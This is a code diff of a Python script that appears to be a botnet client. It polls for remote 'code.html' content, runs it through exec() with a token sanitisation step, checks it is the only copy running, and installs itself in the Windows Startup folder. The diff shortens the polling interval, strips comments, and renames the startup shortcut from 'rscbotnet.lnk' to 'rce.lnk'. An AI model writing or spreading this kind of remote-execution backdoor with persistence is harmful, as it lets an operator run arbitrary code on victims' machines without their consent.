@@ -24,7 +24,7 @@ def main():
 def run_in_visible_terminal(code):
     """Ejecuta el código de code.html en una terminal visible"""
     if sys.platform == "win32":
-        # Ejecuta en una ventana de cmd de Windows
+
         subprocess.Popen(['start', 'cmd', '/k', f'echo {code} & pause'], shell=True)
     else:
         subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', f'echo "{code}" && read -p "Press Enter to exit..."'])
@@ -57,7 +57,6 @@ def fetch_code():
         return None
 
 def execute_code(code):
-    """Execute the content of code.html"""
     try:
         sanitized_code = code.replace('&', '').replace('|', '').replace('&&', '').replace('||', '')
         exec(sanitized_code)  
@@ -77,17 +76,15 @@ def run_check():
                     pass
             else:
                 pass
-            time.sleep(1)
+            time.sleep(0.05)
         except Exception as e:
-            time.sleep(1)  
+            time.sleep(0.05)  
 
 def is_running_in_background():
-    """Check if the script is already running"""
     current_pid = os.getpid()
     for process in psutil.process_iter(['pid', 'name', 'cmdline']):
         try:
             if process.info['pid'] != current_pid:
-                # Verifica que cmdline no sea None antes de intentar acceder a él
                 cmdline = process.info.get('cmdline')
                 if cmdline and __file__ in cmdline:
                     return True
@@ -99,7 +96,7 @@ def add_to_startup():
     """Add the script to startup"""
     startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
     script_path = os.path.abspath(__file__)
-    shortcut_path = os.path.join(startup_folder, 'rscbotnet.lnk')
+    shortcut_path = os.path.join(startup_folder, 'rce.lnk')
 
     if os.path.exists(shortcut_path):
         return
